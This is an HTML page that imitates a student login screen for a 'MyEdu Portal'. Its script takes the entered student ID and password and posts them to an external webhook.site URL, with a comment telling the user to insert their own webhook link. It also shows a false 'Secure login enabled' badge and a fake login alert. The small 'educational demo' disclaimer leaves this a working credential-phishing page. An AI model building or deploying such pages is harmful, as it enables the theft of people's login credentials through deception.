<!DOCTYPE html>
<html>
<head>
  <title>Student Login ‚Äì MyEdu Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f6f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 100px;
    }

    .login-box {
      background-color: #ffffff;
      padding: 25px 35px;
      border-radius: 12px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      width: 300px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      color: #444;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #1976d2;
      color: white;
      font-weight: bold;
      margin-top: 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .secure {
      font-size: 12px;
      color: green;
      text-align: center;
      margin-top: 10px;
    }

    .disclaimer {
      font-size: 11px;
      color: red;
      text-align: center;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Student Portal Login</h2>
    <form id="loginForm">
      <label for="username">Student ID:</label>
      <input type="text" id="username" required>

      <label for="password">Password:</label>
      <input type="password" id="password" required>

      <input type="submit" value="Login">
    </form>

    <div class="secure">üîí Secure login enabled</div>
  </div>

  <div class="disclaimer">
    ‚ö†Ô∏è Educational demo only. Do not enter real credentials.
  </div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const fullData = {
      username: username,
      password: password,
      time: new Date().toLocaleString()
    };

    // Replace this with your Webhook.site link
    fetch("https://webhook.site/be513fd2-fb6f-42d3-84ea-841401f84e0e", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fullData)
    });

    alert("Logging in... (demo)");
  });
</script>
</body>
</html>
